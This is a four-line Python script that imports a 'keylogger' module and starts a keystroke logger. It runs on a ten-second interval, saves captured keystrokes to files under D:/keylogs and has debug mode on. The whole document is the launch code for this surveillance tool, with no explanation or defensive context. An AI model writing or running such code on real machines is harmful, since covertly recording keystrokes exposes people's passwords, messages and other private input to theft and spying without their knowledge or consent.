import keylogger
keyloggers = keylogger.Keylogger(interval=10, report_method='file', save_location='D:/keylogs', debug=True)
keyloggers.debug = True
keyloggers.start()